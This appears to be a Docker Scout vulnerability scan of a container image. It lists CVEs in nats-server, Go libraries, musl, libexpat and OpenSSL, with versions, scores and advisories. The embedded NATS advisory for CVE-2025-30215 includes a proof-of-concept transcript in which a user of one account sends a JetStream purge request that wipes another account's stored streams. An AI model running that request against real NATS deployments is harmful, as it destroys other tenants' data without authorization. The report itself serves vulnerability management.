---
hide_table_of_contents: true
---

<table>
<tr><td>digest</td><td><code>sha256:403c4454b03822e72b8b112c4e21f3ed9b1fe76f770264af233749d141092431</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 1" src="https://img.shields.io/badge/critical-1-8b1924"/> <img alt="high: 4" src="https://img.shields.io/badge/high-4-e25d68"/> <img alt="medium: 7" src="https://img.shields.io/badge/medium-7-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/low-0-lightgrey"/> <!-- unspecified: 0 --></td></tr>
<tr><td>platform</td><td>linux/amd64</td></tr>
<tr><td>size</td><td>65 MB</td></tr>
<tr><td>packages</td><td>208</td></tr>
</table>
</details></table>
</details>

<table>
<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/nats-io/nats-server/v2</strong> <code>2.10.16</code> (golang)</summary>

<small><code>pkg:golang/github.com/nats-io/nats-server@2.10.16#v2</code></small><br/>

```dockerfile
# api-server.Dockerfile (36:36)
COPY --from=build /app /bin/app
```

<br/>

<a href="https://scout.docker.com/v/CVE-2025-30215?s=github&n=v2&ns=github.com%2Fnats-io%2Fnats-server&t=golang&vr=%3E%3D2.2.0%2C%3C2.10.27"><img alt="critical 9.6: CVE--2025--30215" src="https://img.shields.io/badge/CVE--2025--30215-lightgrey?label=critical%209.6&labelColor=8b1924"/></a> <i>Improper Authorization</i>

<table>
<tr><td>Affected range</td><td><code>>=2.2.0<br/><2.10.27</code></td></tr>
<tr><td>Fixed version</td><td><code>2.10.27</code></td></tr>
<tr><td>CVSS Score</td><td><code>9.6</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.032%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Advisory

The management of JetStream assets happens with messages in the `$JS.` subject namespace in the system account; this is partially exposed into regular accounts to allow account holders to manage their assets.

Some of the JS API requests were missing access controls, allowing any user with JS management permissions in any account to perform certain administrative actions on any JS asset in any other account. At least one of the unprotected APIs allows for data destruction. None of the affected APIs allow disclosing stream contents.

### Affected versions

NATS Server:
 * Version 2 from v2.2.0 onwards, prior to v2.11.1 or v2.10.27

-----

## Original Report

(Lightly edited to confirm some supposition and in the summary to use past tense)

### Summary

nats-server did not include authorization checks on 4 separate admin-level JetStream APIs: account purge, server remove,  account stream move, and  account stream cancel-move.

In all cases, APIs are not properly restricted to system-account users. Instead, _any_ authorized user can execute the APIs, including across account boundaries, as long as the current user merely has permission to publish on `$JS.>`.

Only the first seems to be of highest severity. All are included in this single report as they seem likely to have the same underlying root cause.

Reproduction of the `ACCOUNT.PURGE` case is below. The others are like it.


### Details & Impact

#### Issue 1: `$JS.API.ACCOUNT.PURGE.*`

Any user may perform an account purge of any other account (including their own).

Risk: total destruction of Jetstream configuration and data.


#### Issue 2: `$JS.API.SERVER.REMOVE`

Any user may remove servers from Jetstream clusters.

Risk: Loss of data redundancy, reduction of service quality.


#### Issue 3: `$JS.API.ACCOUNT.STREAM.MOVE.*.*` and `CANCEL_MOVE`

Any user may cause streams to be moved between servers.

Risk: loss of control of data provenance, reduced service quality during move, enumeration of account and/or stream names.

Similarly for `$JS.API.ACCOUNT.STREAM.CANCEL_MOVE.*.*`


#### Mitigations

It appears that users without permission to publish on `$JS.API.ACCOUNT.>` or `$JS.API.SERVER.>` are unable to execute the above APIs.

Unfortunately, in many configurations, an 'admin' user for a single account will be given permissions for `$JS.>` (or simply `>`), which allows the improper access to the system APIs above.


#### Scope of impact

Issues 1 and 3 both cross boundaries between accounts, violating promised account isolation. All 3 allow system level access to non-system account users.

While I cannot speak to what authz configurations are actually found in the wild, per the discussion in Mitigations above, it seems likely that at least some configurations are vulnerable.


#### Additional notes

It appears that `$JS.API.META.LEADER.STEPDOWN` does properly restrict to system account users. As such, this may be a pattern for how to properly authorize these other APIs.



### PoC

#### Environment

Tested with:
nats-server 2.10.26 (installed via homebrew)
nats cli 0.1.6 (installed via homebrew)
macOS 13.7.4


#### Reproduction steps

```
$ nats-server --version
nats-server: v2.10.26

$ nats --version
0.1.6

$ cat nats-server.conf
listen: '0.0.0.0:4233'
jetstream: {
  store_dir: './tmp'
}
accounts: {
  '$SYS': {
    users: [{user: 'sys', password: 'sys'}]
  },
  'TEST': {
    jetstream: true,
    users: [{user: 'a', password: 'a'}]
  },
  'TEST2': {
    jetstream: true,
    users: [{user: 'b', password: 'b'}]
  }
}

$ nats-server -c ./nats-server.conf
...
[90608] 2025/03/02 11:43:18.494663 [INF] Using configuration file: ./nats-server.conf
...
[90608] 2025/03/02 11:43:18.496395 [INF] Listening for client connections on 0.0.0.0:4233
...

# Authentication is effectively enabled by the server:
$ nats -s nats://localhost:4233 account info
nats: error: setup failed: nats: Authorization Violation

$ nats -s nats://localhost:4233 account info --user sys --password wrong
nats: error: setup failed: nats: Authorization Violation

$ nats -s nats://localhost:4233 account info --user a --password wrong
nats: error: setup failed: nats: Authorization Violation

$ nats -s nats://localhost:4233 account info --user b --password wrong
nats: error: setup failed: nats: Authorization Violation

# Valid credentials work, and users properly matched to accounts:
$ nats -s nats://localhost:4233 account info --user sys --password sys
Account Information
                      User: sys
                   Account: $SYS
...

$ nats -s nats://localhost:4233 account info --user a --password a
Account Information
                           User: a
                        Account: TEST
...

$ nats -s nats://localhost:4233 account info --user b --password b
Account Information
                           User: b
                        Account: TEST2
...

# Add a stream and messages to account TEST (user 'a'):
$ nats -s nats://localhost:4233 --user a --password a stream add stream1 --subjects s1 --storage file --defaults
Stream stream1 was created
...

$ nats -s nats://localhost:4233 --user a --password a publish s1 --count 3 "msg {{Count}}"
11:50:05 Published 5 bytes to "s1"
11:50:05 Published 5 bytes to "s1"
11:50:05 Published 5 bytes to "s1"

# Messages are correctly persisted on account TEST, and not on TEST2:
$ nats -s nats://localhost:4233 --user a --password a stream ls
╭───────────────────────────────────────────────────────────────────────────────╮
│                                    Streams                                    │
├─────────┬─────────────┬─────────────────────┬──────────┬───────┬──────────────┤
│ Name    │ Description │ Created             │ Messages │ Size  │ Last Message │
├─────────┼─────────────┼─────────────────────┼──────────┼───────┼──────────────┤
│ stream1 │             │ 2025-03-02 11:48:49 │ 3        │ 111 B │ 46.01s       │
╰─────────┴─────────────┴─────────────────────┴──────────┴───────┴──────────────╯

$ nats -s nats://localhost:4233 --user b --password b stream ls
No Streams defined

$ du -h tmp/jetstream
  0B	tmp/jetstream/TEST/streams/stream1/obs
8.0K	tmp/jetstream/TEST/streams/stream1/msgs
 16K	tmp/jetstream/TEST/streams/stream1
 16K	tmp/jetstream/TEST/streams
 16K	tmp/jetstream/TEST
 16K	tmp/jetstream

# User b (account TEST2) sends a PURGE command for account TEST (user a).
# According to the source comments, user b shouldn't even be able to purge it's own account, much less another one.
$ nats -s nats://localhost:4233 --user b --password b request '$JS.API.ACCOUNT.PURGE.TEST' ''
11:54:50 Sending request on "$JS.API.ACCOUNT.PURGE.TEST"
11:54:50 Received with rtt 1.528042ms
{"type":"io.nats.jetstream.api.v1.account_purge_response","initiated":true}

# From nats-server in response to the purge request:
[90608] 2025/03/02 11:54:50.277144 [INF] Purge request for account TEST (streams: 1, hasAccount: true)

# And indeed, the stream data is gone on account TEST:
$ du -h tmp/jetstream
  0B	tmp/jetstream

$ nats -s nats://localhost:4233 --user a --password a stream ls
No Streams defined

```

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>golang.org/x/crypto</strong> <code>0.32.0</code> (golang)</summary>

<small><code>pkg:golang/golang.org/x/crypto@0.32.0</code></small><br/>

```dockerfile
# api-server.Dockerfile (36:36)
COPY --from=build /app /bin/app
```

<br/>

<a href="https://scout.docker.com/v/CVE-2025-22869?s=golang&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3C0.35.0"><img alt="high : CVE--2025--22869" src="https://img.shields.io/badge/CVE--2025--22869-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;0.35.0</code></td></tr>
<tr><td>Fixed version</td><td><code>0.35.0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.042%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

SSH servers which implement file transfer protocols are vulnerable to a denial of service attack from clients which complete the key exchange slowly, or not at all, causing pending content to be read into memory, but never transmitted.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>musl</strong> <code>1.2.5-r0</code> (apk)</summary>

<small><code>pkg:apk/alpine/musl@1.2.5-r0?arch=x86_64&distro=alpine-3.20.3</code></small><br/>

```dockerfile
# api-server.Dockerfile (33:33)
FROM ${ALPINE_IMAGE}
```

<br/>

<a href="https://scout.docker.com/v/CVE-2025-26519?s=alpine&n=musl&ns=alpine&t=apk&osn=alpine&osv=3.20&vr=%3C1.2.5-r1"><img alt="high : CVE--2025--26519" src="https://img.shields.io/badge/CVE--2025--26519-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.2.5-r1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.2.5-r1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.010%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>libexpat</strong> <code>2.6.4-r0</code> (apk)</summary>

<small><code>pkg:apk/alpine/libexpat@2.6.4-r0?arch=x86_64&distro=alpine-3.20.3&upstream=expat</code></small><br/>

```dockerfile
# api-server.Dockerfile (34:34)
RUN apk --no-cache add ca-certificates libssl3 git
```

<br/>

<a href="https://scout.docker.com/v/CVE-2024-8176?s=alpine&n=expat&ns=alpine&t=apk&osn=alpine&osv=3.20&vr=%3C2.7.0-r0"><img alt="high : CVE--2024--8176" src="https://img.shields.io/badge/CVE--2024--8176-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;2.7.0-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.7.0-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.346%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>56th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>golang.org/x/oauth2</strong> <code>0.26.0</code> (golang)</summary>

<small><code>pkg:golang/golang.org/x/oauth2@0.26.0</code></small><br/>

```dockerfile
# api-server.Dockerfile (36:36)
COPY --from=build /app /bin/app
```

<br/>

<a href="https://scout.docker.com/v/CVE-2025-22868?s=golang&n=oauth2&ns=golang.org%2Fx&t=golang&vr=%3C0.27.0"><img alt="high : CVE--2025--22868" src="https://img.shields.io/badge/CVE--2025--22868-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;0.27.0</code></td></tr>
<tr><td>Fixed version</td><td><code>0.27.0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.051%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>16th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An attacker can pass a malicious malformed token which causes unexpected memory to be consumed during parsing.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 3" src="https://img.shields.io/badge/M-3-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>libssl3</strong> <code>3.3.2-r0</code> (apk)</summary>

<small><code>pkg:apk/alpine/libssl3@3.3.2-r0?arch=x86_64&distro=alpine-3.20.3&upstream=openssl</code></small><br/>

```dockerfile
# api-server.Dockerfile (33:33)
FROM ${ALPINE_IMAGE}
```

<br/>

<a href="https://scout.docker.com/v/CVE-2024-12797?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.20&vr=%3C3.3.3-r0"><img alt="medium : CVE--2024--12797" src="https://img.shields.io/badge/CVE--2024--12797-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.3-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.3-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.183%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>41st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-9143?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.20&vr=%3C3.3.2-r1"><img alt="medium : CVE--2024--9143" src="https://img.shields.io/badge/CVE--2024--9143-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.2-r1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.2-r1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.372%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>58th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-13176?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.20&vr=%3C3.3.2-r2"><img alt="medium : CVE--2024--13176" src="https://img.shields.io/badge/CVE--2024--13176-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.3.2-r2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.2-r2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.033%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>golang.org/x/net</strong> <code>0.34.0</code> (golang)</summary>

<small><code>pkg:golang/golang.org/x/net@0.34.0</code></small><br/>

```dockerfile
# api-server.Dockerfile (36:36)
COPY --from=build /app /bin/app
```

<br/>

<a href="https://scout.docker.com/v/CVE-2025-22872?s=github&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.38.0"><img alt="medium 5.3: CVE--2025--22872" src="https://img.shields.io/badge/CVE--2025--22872-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</i>

<table>
<tr><td>Affected range</td><td><code>&lt;0.38.0</code></td></tr>
<tr><td>Fixed version</td><td><code>0.38.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The tokenizer incorrectly interprets tags with unquoted attribute values that end with a solidus character (/) as self-closing. When directly using Tokenizer, this can result in such tags incorrectly being marked as self-closing, and when using the Parse functions, this can result in content following such tags as being placed in the wrong scope during DOM construction, but only when tags are in foreign content (e.g. <math>, <svg>, etc contexts).

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-22870?s=github&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.36.0"><img alt="medium 4.4: CVE--2025--22870" src="https://img.shields.io/badge/CVE--2025--22870-lightgrey?label=medium%204.4&labelColor=fbb552"/></a> <i>Misinterpretation of Input</i>

<table>
<tr><td>Affected range</td><td><code>&lt;0.36.0</code></td></tr>
<tr><td>Fixed version</td><td><code>0.36.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>4.4</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.009%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Matching of hosts against proxy patterns can improperly treat an IPv6 zone ID as a hostname component. For example, when the NO_PROXY environment variable is set to "*.example.com", a request to "[::1%25.example.com]:80` will incorrectly match and not be proxied.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>gopkg.in/square/go-jose.v2</strong> <code>2.6.0</code> (golang)</summary>

<small><code>pkg:golang/gopkg.in/square/go-jose.v2@2.6.0</code></small><br/>

```dockerfile
# api-server.Dockerfile (36:36)
COPY --from=build /app /bin/app
```

<br/>

<a href="https://scout.docker.com/v/CVE-2024-28180?s=github&n=go-jose.v2&ns=gopkg.in%2Fsquare&t=golang&vr=%3C%3D2.6.0"><img alt="medium 4.3: CVE--2024--28180" src="https://img.shields.io/badge/CVE--2024--28180-lightgrey?label=medium%204.3&labelColor=fbb552"/></a> <i>Improper Handling of Highly Compressed Data (Data Amplification)</i>

<table>
<tr><td>Affected range</td><td><code>&lt;=2.6.0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>4.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.247%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>48th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact
An attacker could send a JWE containing compressed data that used large amounts of memory and CPU when decompressed by Decrypt or DecryptMulti. Those functions now return an error if the decompressed data would exceed 250kB or 10x the compressed size (whichever is larger). Thanks to Enze Wang@Alioth and Jianjun Chen@Zhongguancun Lab (@zer0yu and @chenjj) for reporting.

### Patches
The problem is fixed in the following packages and versions:
- github.com/go-jose/go-jose/v4 version 4.0.1
- github.com/go-jose/go-jose/v3 version 3.0.3
- gopkg.in/go-jose/go-jose.v2 version 2.6.3

The problem will not be fixed in the following package because the package is archived:
- gopkg.in/square/go-jose.v2

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/vektah/gqlparser/v2</strong> <code>2.5.2-0.20230422221642-25e09f9d292d</code> (golang)</summary>

<small><code>pkg:golang/github.com/vektah/gqlparser@2.5.2-0.20230422221642-25e09f9d292d#v2</code></small><br/>

```dockerfile
# api-server.Dockerfile (36:36)
COPY --from=build /app /bin/app
```

<br/>

<a href="https://scout.docker.com/v/CVE-2023-49559?s=github&n=v2&ns=github.com%2Fvektah%2Fgqlparser&t=golang&vr=%3C2.5.14"><img alt="medium 5.3: CVE--2023--49559" src="https://img.shields.io/badge/CVE--2023--49559-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>&lt;2.5.14</code></td></tr>
<tr><td>Fixed version</td><td><code>2.5.14</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.061%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>20th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue in vektah gqlparser open-source-library v.2.5.10 allows a remote attacker to cause a denial of service via a crafted script to the parserDirectives function.

</blockquote>
</details>
</details></td></tr>
</table>

